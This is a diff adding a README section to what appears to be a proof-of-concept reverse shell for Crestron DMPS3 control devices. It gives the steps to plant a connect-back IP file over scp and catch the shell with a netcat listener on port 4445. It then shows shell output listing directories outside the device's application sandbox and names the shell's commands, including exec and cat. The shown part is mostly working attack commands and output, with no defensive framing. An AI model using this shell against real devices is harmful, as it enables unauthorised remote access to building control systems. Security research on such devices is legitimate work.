@@ -66,3 +66,63 @@ NVRAMUsed=0
 ```
 
 Replacing PRO3 with the device type will ensure the device does not reject the application.
+
+# Using the shell
+
+The shell expects a \User\ip file with the IP address to connect back to. Port 4445 is hardcoded.
+
+```
+echo -n 192.168.1.123 > ip
+scp ip crestron@192.168.1.174:/User
+```
+
+Once the connection is made, you can begin insteracting outside of the sandbox.
+
+```
+Brandons-iMac:~ bperry$ nc -l 4445
+Connected
+ > ls
+\Network
+\Windows
+\Temp
+\Program Files
+\My Documents
+\HTML
+\Sys
+\Simpl
+\Nvram
+\FTP
+\User
+\ROMDISK
+\Application Data
+\My Recent Documents
+\Recycled
+\SSHBanner
+ >  
+ ```
+ 
+ For instance, compared to the sandbox directory list.
+ 
+ ```
+ Brandons-iMac:~ bperry$ telnet 192.168.1.174
+Trying 192.168.1.174...
+Connected to dmps3-7f81812f.attlocal.net.
+Escape character is '^]'.
+DMPS3-4K-150-C Console
+Warning: Another console session is open 
+
+DMPS3-4K-150-C>dir
+Directory of \
+       [DIR]  09-21-15 08:58:24 FTP
+       [DIR]  09-21-15 08:58:24 HTML
+       [DIR]  09-21-15 08:58:24 Nvram
+       [DIR]  09-21-15 08:58:26 ROMDISK
+       [DIR]  09-21-15 08:58:24 Simpl
+       [DIR]  09-21-15 09:05:26 SSHBanner
+       [DIR]  09-21-15 08:58:24 Sys
+       [DIR]  09-21-15 08:58:26 User
+
+DMPS3-4K-150-C>
+```
+
+Available commands are `ls`, `pwd`, `exec`, `cat`, `cd`, and `base64`.
